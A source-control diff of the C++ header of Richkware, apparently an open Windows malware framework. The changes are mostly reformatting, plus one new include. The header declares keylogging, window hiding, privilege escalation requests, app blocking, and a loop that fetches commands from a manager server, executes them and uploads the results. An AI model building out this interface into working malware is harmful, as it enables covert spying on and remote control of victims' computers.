@@ -11,6 +11,7 @@
 #include <winbase.h>
 #include <winreg.h>
 #include <winuser.h>
+//#include <ws2tcpip.h>
 
 #include <fstream>
 #include <stdio.h>
@@ -22,6 +23,7 @@
 #include <iterator>
 #include <list>
 
+#include "utils.h"
 #include "crypto.h"
 #include "blockApps.h"
 #include "network.h"
@@ -29,36 +31,41 @@
 
 class Richkware {
 private:
-	std::string appName;
+    std::string appName;
     std::string encryptionKey;
 public:
-	BlockApps blockApps;
-	Network network;
-	Session session;
-	SystemStorage systemStorage;
+    BlockApps blockApps;
+    Network network;
+    Session session;
+    SystemStorage systemStorage;
 
-	Richkware(const char* AppNameArg, std::string EncryptionKeyArg);
+    Richkware(const char *AppNameArg, std::string EncryptionKeyArg);
 
     //Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.
-	Richkware(const char* AppNameArg, std::string defaultEncryptionKey, const char* serverAddress, const char* port, const char *associatedUser);
+    Richkware(const char *AppNameArg, const std::string &defaultEncryptionKey, const char *serverAddress,
+              const char *port,
+              const char *associatedUser);
 
-	BOOL IsAdmin();
-	void RequestAdminPrivileges();
+    BOOL IsAdmin();
 
-	void StealthWindow(const char* window);
-	void OpenApp(const char* app);
-	void Keylogger(const char* fileName);
+    void RequestAdminPrivileges();
 
+    void StealthWindow(const char *window);
+
+    void OpenApp(const char *app);
+
+    void Keylogger(const char *fileName);
+
+    void Hibernation();
+
+    void RandMouse();
     std::vector<std::string> getCommands(const char *serverAddress, const char *port);
     std::string executeCommand(std::string command);
 
     void uploadCommandsResponse(std::string, const char *serverAddress, const char *port);
 
-	void Hibernation();
-	void RandMouse();
-
 };
 
-DWORD WINAPI KeyloggerThread(void* arg);
+DWORD WINAPI KeyloggerThread(void *arg);
 
 #endif /* RICHKWARE_H_ */
